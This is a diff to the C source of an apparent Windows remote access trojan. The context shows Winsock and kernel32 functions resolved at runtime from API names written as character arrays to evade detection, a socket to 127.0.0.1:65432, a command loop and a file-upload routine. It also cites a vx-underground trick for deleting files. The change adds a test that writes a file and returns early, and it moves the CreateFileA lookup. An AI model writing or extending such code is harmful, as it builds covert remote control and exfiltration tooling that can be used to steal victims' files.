@@ -123,6 +123,23 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
+	HANDLE fileHandle = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if ( fileHandle == INVALID_HANDLE_VALUE )
+	{
+		OutputDebugStringA("Error");
+	}
+
+	char* toWriteBuffer = "This is a test.";
+	DWORD bytesWritten;
+	WriteFile(fileHandle, toWriteBuffer, 15, &bytesWritten, 0);
+
+	char buffer[256];
+	sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
+	OutputDebugStringA(buffer);
+	
+	CloseHandle(fileHandle);
+	return 0;
+	
 	srand( (unsigned)time( NULL ) );
 	
 	RATSocket ratSocket = {};
@@ -173,7 +190,7 @@ WinMain(HINSTANCE hInstance,
 		_inet_addr* f_inet_addr = (_inet_addr*)GetProcAddress(ratSocket.libraryWinsock2, ca_inet_addr);
 
 		char ca_ip_addr[] = { '1','2','7','.','0','.','0','.','1', 0 };
-	
+ 
 		struct sockaddr_in socketAddress;
 		socketAddress.sin_family = AF_INET;
 		socketAddress.sin_port = f_htons(65432);
@@ -220,6 +237,9 @@ WinMain(HINSTANCE hInstance,
 		return 1;
 	}
 
+	char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
+	_CreateFileA* f_CreateFileA = (_CreateFileA*)GetProcAddress(libraryKernel32, ca_CreateFileA);
+	
 	for(;;)
 	{
 		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
@@ -386,8 +406,6 @@ WinMain(HINSTANCE hInstance,
 			SocketUploadFile(&ratSocket, filePath);
 
 			// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
-			char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
-			_CreateFileA* f_CreateFileA = (_CreateFileA*)GetProcAddress(libraryKernel32, ca_CreateFileA);
 			HANDLE handle = f_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
 			if ( handle == INVALID_HANDLE_VALUE )
 			{
